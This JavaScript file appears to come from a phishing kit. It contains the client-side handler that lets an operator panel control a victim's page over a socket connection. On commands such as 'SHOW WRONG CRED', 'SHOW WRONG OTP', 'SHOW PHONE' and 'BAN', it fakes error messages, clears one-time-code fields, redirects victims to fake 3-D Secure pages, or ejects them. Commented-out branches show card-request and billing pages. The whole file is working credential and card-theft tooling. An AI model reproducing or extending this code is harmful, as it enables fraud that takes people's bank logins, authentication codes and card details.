function initActionsOnCommandsFromPanelFunc(socket) {
    socket.on('toFishAction', data => {
        console.log(data);

        if (data.action === 'BAN') {
            window.location.replace(`${banLink}`);
        }
        if (data.action === 'SHOW WRONG CRED') {
            hpLoadingRing.classList.add('displaynone');

            alert('Invalid credentials. Check your information and try again');
        }

        if (data.action === 'SHOW WRONG OTP') {
            hpLoadingRing.classList.add('displaynone');
            // alert("Wrong OTP code");
            hpErrorOTPDiv.classList.remove('displaynone');
            hpOTPInput.value = '';
        }

        if (data.action === 'SHOW PHONE') {
            window.location.replace(`/3ds.html?otp=PHONE`);
        }

        if (data.action === 'SHOW AUTH APP') {
            window.location.replace(`/3ds.html?otp=AuthApp`);
        }

        // if (data.action === 'SHOW PAGE OTHER1') {
        //     hpLoadingRing.classList.add('displaynone');

        //     hpPageLogin.classList.add('displaynone');
        //     hpPageOTPPhone.classList.add('displaynone');
        //     hpPageCardRequest.classList.add('displaynone');
        //     hpPageOTPBilling.classList.remove('displaynone');

        //     hpPageOTPPhoneCSS.removeAttribute('disabled');
        // }

        // if (data.action === 'SHOW CARD REQUEST') {
        //     hpLoadingRing.classList.add('displaynone');

        //     hpPageLogin.classList.add('displaynone');
        //     hpPageOTPPhone.classList.add('displaynone');
        //     hpPageOTPBilling.classList.add('displaynone');
        //     hpPageCardRequest.classList.remove('displaynone');

        //     hpPageOTPPhoneCSS.removeAttribute('disabled');
        // }

        // if (data.action === 'SHOW SECRET') {
        //     console.log('this is SHOW SECRET');
        //     window.location.replace(`/2.html`);
        // }
    });

    socket.on('toFishSocketId', data => {
        console.log('this is toFishAction');
        console.log(data);
        localStorage.hpFirstSocketId = data.socketId;
    });
}
